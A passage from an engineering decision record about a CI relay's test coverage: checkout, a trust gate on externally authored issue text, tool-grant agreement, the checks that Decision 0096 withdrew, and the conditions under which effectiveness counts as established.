candidate checkout, the sanitised report publication and the turn bound,
the no-Pull-Request path, the forwarded inline location, the trust gate on
externally authored issue text, the agreement between the tool grant and the
requested permissions, the recorded supersession, and the explicit delivery path — alongside every existing Decision 0093
invariant. The `immutable-provider-ci-adapters` guardrail owns the workflows,
both Decisions and that test.

*Since Decision 0096 some of that coverage is withdrawn with what it covered.* The
review events are no longer admitted (Decision 0096 rule 13), so there is no reviewed
head to bind and no inline location to forward, and those tests were removed. The
checkout is a ref-less checkout of the protected revision (rule 11 there); the
comparison is the live Pull Request with admission refusing a fork-controlled head
(rule 5 there); and "every admitted trigger payload" now means the two events the
relay still admits, each re-read by admission.

Effectiveness is not claimed by this Decision. It is established only when a
mention on a Pull Request of #319's size completes with a non-zero
`total_cost_usd` and more than one turn.
